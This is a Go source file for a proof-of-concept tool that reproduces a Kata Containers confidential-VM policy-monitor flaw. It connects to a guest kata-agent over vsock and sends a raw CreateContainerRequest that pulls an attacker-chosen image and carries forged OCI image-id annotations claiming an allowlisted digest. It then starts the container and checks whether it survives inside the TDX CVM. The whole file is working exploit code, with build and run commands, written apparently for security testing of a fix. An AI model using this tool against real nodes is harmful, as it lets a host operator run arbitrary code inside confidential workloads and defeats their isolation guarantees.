// kata-host-create is a host-side tool for reproducing the c8s policy-monitor annotation-forgery issue (docs/security/RT-003-policy-monitor-host-annotations.md). It connects to a
// running kata guest's agent over vsock and issues a raw ttRPC
// CreateContainerRequest — exactly what the kata shim is allowed to do, and
// therefore exactly what anyone controlling the host (kubelet, containerd,
// or plain root) can do to any CVM pod on the node.
//
// The container it creates:
//   - pulls an ATTACKER-CHOSEN image inside the guest (guest-pull storage),
//   - carries FORGED OCI annotations claiming a different, allowlisted
//     image digest (io.kubernetes.cri.image-id).
//
// Against a guest with no policy-monitor (the pre-2026-07-22 deployment
// posture) the container simply runs: arbitrary host-chosen code inside a
// "confidential" TDX CVM. Against a policy-monitor that trusts the
// host-authored annotations (pre-fix versions) the forged digest
// is accepted and the container is allowed. The fixed monitor instead
// trusts only the agent-stamped c8s-pulled-image ref and kills it.
//
// Build (needs the kata-containers checkout for the generated bindings):
//
//	cd test/kata-host-create
//	KATA=/path/to/kata-containers/src/runtime go mod edit -replace \
//	  github.com/kata-containers/kata-containers/src/runtime=$KATA
//	go build .
//
// Run (as root on the k8s node):
//
//	sudo ./kata-host-create -cid <guest-cid> -sandbox <sandbox-id> \
//	  -image docker.io/library/alpine:3.20 \
//	  -forged-image-id sha256:<allowlisted-digest>
package main

import (
	"context"
	"flag"
	"fmt"
	"net"
	"os"
	"time"

	"github.com/containerd/ttrpc"
	agentgrpc "github.com/kata-containers/kata-containers/src/runtime/virtcontainers/pkg/agent/protocols/grpc"
	"github.com/mdlayher/vsock"
	specs "github.com/opencontainers/runtime-spec/specs-go"
)

func main() {
	var (
		cid          = flag.Uint("cid", 0, "vsock guest CID of the target kata VM")
		port         = flag.Uint("port", 1024, "kata-agent vsock port")
		sandbox      = flag.String("sandbox", "", "sandbox (pod) ID of the target pod")
		containerID  = flag.String("container-id", "deadbeefcafe0001deadbeefcafe0001deadbeefcafe0001deadbeefcafe0001", "container ID to create")
		image        = flag.String("image", "docker.io/library/alpine:3.20", "attacker image ref to pull in-guest")
		forgedID     = flag.String("forged-image-id", "", "forged io.kubernetes.cri.image-id annotation (allowlisted digest)")
		cmd          = flag.String("cmd", "sleep 600", "command to run inside the container")
		probeSeconds = flag.Int("probe", 20, "seconds to poll container stats after start")
		remove       = flag.Bool("remove", false, "kill and remove the container after probing")
		removeOnly   = flag.Bool("remove-only", false, "only kill+remove -container-id (cleanup of a previous run)")
	)
	flag.Parse()

	if *cid == 0 || *sandbox == "" {
		fmt.Fprintln(os.Stderr, "-cid and -sandbox are required")
		os.Exit(2)
	}

	ctx := context.Background()

	conn, err := vsock.Dial(uint32(*cid), uint32(*port), nil)
	if err != nil {
		fmt.Fprintf(os.Stderr, "vsock dial cid=%d port=%d: %v\n", *cid, *port, err)
		os.Exit(1)
	}
	defer conn.Close()
	client := ttrpc.NewClient(conn, ttrpc.WithOnClose(func() { os.Exit(0) }))
	defer client.Close()
	agent := agentgrpc.NewAgentServiceClient(client)

	if *removeOnly {
		if _, err := agent.SignalProcess(ctx, &agentgrpc.SignalProcessRequest{ContainerId: *containerID, Signal: 9}); err != nil {
			fmt.Printf("[*] signal: %v\n", err)
		}
		time.Sleep(time.Second)
		if _, err := agent.RemoveContainer(ctx, &agentgrpc.RemoveContainerRequest{ContainerId: *containerID}); err != nil {
			fmt.Printf("[-] remove: %v\n", err)
			os.Exit(1)
		}
		fmt.Println("[+] container removed")
		return
	}

	rootfsGuestPath := fmt.Sprintf("/run/kata-containers/%s/rootfs", *containerID)

	annotations := map[string]string{
		"io.kubernetes.cri.container-type":      "container",
		"io.kubernetes.cri.image-name":          *image, // host-chosen pull ref
		"io.kubernetes.cri.sandbox-id":          *sandbox,
		"io.katacontainers.pkg.oci.bundle_path": "/run/kata-containers/" + *containerID,
	}
	if *forgedID != "" {
		annotations["io.kubernetes.cri.image-id"] = *forgedID // forged allowlisted digest
	}

	args := []string{"/bin/sh", "-c", *cmd}
	caps := &specs.LinuxCapabilities{
		Bounding:  []string{"CAP_CHOWN", "CAP_DAC_OVERRIDE", "CAP_FSETID", "CAP_FOWNER", "CAP_MKNOD", "CAP_NET_RAW", "CAP_SETGID", "CAP_SETUID", "CAP_SETFCAP", "CAP_SETPCAP", "CAP_NET_BIND_SERVICE", "CAP_SYS_CHROOT", "CAP_KILL", "CAP_AUDIT_WRITE"},
		Effective: []string{"CAP_CHOWN", "CAP_DAC_OVERRIDE", "CAP_FSETID", "CAP_FOWNER", "CAP_MKNOD", "CAP_NET_RAW", "CAP_SETGID", "CAP_SETUID", "CAP_SETFCAP", "CAP_SETPCAP", "CAP_NET_BIND_SERVICE", "CAP_SYS_CHROOT", "CAP_KILL", "CAP_AUDIT_WRITE"},
		Permitted: []string{"CAP_CHOWN", "CAP_DAC_OVERRIDE", "CAP_FSETID", "CAP_FOWNER", "CAP_MKNOD", "CAP_NET_RAW", "CAP_SETGID", "CAP_SETUID", "CAP_SETFCAP", "CAP_SETPCAP", "CAP_NET_BIND_SERVICE", "CAP_SYS_CHROOT", "CAP_KILL", "CAP_AUDIT_WRITE"},
	}
	spec := &specs.Spec{
		Version: "1.0.2",
		Process: &specs.Process{
			Args:            args,
			Cwd:             "/",
			Terminal:        false,
			Env:             []string{"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"},
			Capabilities:    caps,
			NoNewPrivileges: true,
		},
		Root: &specs.Root{Path: rootfsGuestPath},
		Mounts: []specs.Mount{
			{Destination: "/proc", Type: "proc", Source: "proc"},
			{Destination: "/dev", Type: "tmpfs", Source: "tmpfs", Options: []string{"nosuid", "strictatime", "mode=755", "size=65536k"}},
			{Destination: "/dev/pts", Type: "devpts", Source: "devpts", Options: []string{"nosuid", "noexec", "newinstance", "ptmxmode=0666", "mode=0620", "gid=5"}},
			{Destination: "/dev/shm", Type: "tmpfs", Source: "shm", Options: []string{"nosuid", "noexec", "nodev", "mode=1777", "size=65536k"}},
			{Destination: "/dev/mqueue", Type: "mqueue", Source: "mqueue", Options: []string{"nosuid", "noexec", "nodev"}},
			{Destination: "/sys", Type: "sysfs", Source: "sysfs", Options: []string{"nosuid", "noexec", "nodev", "ro"}},
		},
		Annotations: annotations,
		Linux: &specs.Linux{
			Namespaces: []specs.LinuxNamespace{
				{Type: specs.MountNamespace},
				{Type: specs.IPCNamespace},
				{Type: specs.UTSNamespace},
				{Type: specs.PIDNamespace},
				{Type: specs.NetworkNamespace},
				{Type: specs.CgroupNamespace},
			},
		},
	}
	hostname := "rt003-poc"
	spec.Hostname = hostname

	grpcSpec, err := agentgrpc.OCItoGRPC(spec)
	if err != nil {
		fmt.Fprintf(os.Stderr, "OCItoGRPC: %v\n", err)
		os.Exit(1)
	}

	// Guest-pull storage: the agent pulls `image` in-guest and mounts it at
	// the rootfs path. This mirrors exactly what the shim sends under
	// experimental_force_guest_pull (kata_agent.go handleImageGuestPullBlockVolume).
	pullMeta := fmt.Sprintf(`{"metadata":%s}`, mustJSONMap(annotations))
	storage := &agentgrpc.Storage{
		Driver:        "image_guest_pull",
		Source:        *image,
		Fstype:        "overlay",
		MountPoint:    rootfsGuestPath,
		DriverOptions: []string{"image_guest_pull=" + pullMeta},
	}

	req := &agentgrpc.CreateContainerRequest{
		ContainerId: *containerID,
		OCI:         grpcSpec,
		Storages:    []*agentgrpc.Storage{storage},
	}

	fmt.Printf("[*] cid=%d sandbox=%s container=%s\n", *cid, *sandbox, *containerID)
	fmt.Printf("[*] pull source (host-chosen): %s\n", *image)
	if *forgedID != "" {
		fmt.Printf("[*] forged image-id annotation: %s\n", *forgedID)
	}
	fmt.Println("[*] sending CreateContainerRequest over vsock ttRPC...")

	if _, err := agent.CreateContainer(ctx, req); err != nil {
		fmt.Fprintf(os.Stderr, "CreateContainer: %v\n", err)
		os.Exit(1)
	}
	fmt.Println("[+] CreateContainer accepted — kata-agent pulled the image and wrote the bundle")

	if _, err := agent.StartContainer(ctx, &agentgrpc.StartContainerRequest{ContainerId: *containerID}); err != nil {
		fmt.Fprintf(os.Stderr, "StartContainer: %v\n", err)
		os.Exit(1)
	}
	fmt.Println("[+] StartContainer accepted — container init started")
	fmt.Printf("[*] polling StatsContainer for %ds (SIGKILL by policy-monitor shows as a stats failure / exit)...\n", *probeSeconds)

	var lastErr error
	for i := 0; i < *probeSeconds; i++ {
		select {
		case <-time.After(time.Second):
		}
		var st *agentgrpc.StatsContainerResponse
		st, lastErr = agent.StatsContainer(ctx, &agentgrpc.StatsContainerRequest{ContainerId: *containerID})
		if lastErr != nil {
			fmt.Printf("[-] t+%2ds stats failed: %v\n", i+1, lastErr)
			break
		}
		_ = st
		fmt.Printf("[+] t+%2ds container alive\n", i+1)
	}

	if lastErr == nil {
		fmt.Printf("[RESULT] container survived %ds — arbitrary host-chosen code is running inside the CVM\n", *probeSeconds)
	} else {
		fmt.Printf("[RESULT] container died after start — likely SIGKILLed by policy-monitor (digest denied)\n")
	}

	if *remove {
		if _, err := agent.SignalProcess(ctx, &agentgrpc.SignalProcessRequest{
			ContainerId: *containerID,
			Signal:      9, // SIGKILL
		}); err != nil {
			fmt.Printf("[*] signal (cleanup): %v\n", err)
		}
		time.Sleep(time.Second)
		if _, err := agent.RemoveContainer(ctx, &agentgrpc.RemoveContainerRequest{ContainerId: *containerID}); err != nil {
			fmt.Printf("[*] remove (cleanup): %v\n", err)
		} else {
			fmt.Println("[+] container removed (cleanup)")
		}
		return
	}

	// Leave the container in place for inspection; re-run with -remove to
	// clean it up.
	fmt.Println("[*] done (container left running; re-run with -remove to clean up)")
}

func mustJSONMap(m map[string]string) string {
	out := "{"
	first := true
	for k, v := range m {
		if !first {
			out += ","
		}
		first = false
		out += fmt.Sprintf("%q:%q", k, v)
	}
	return out + "}"
}

var _ net.Conn
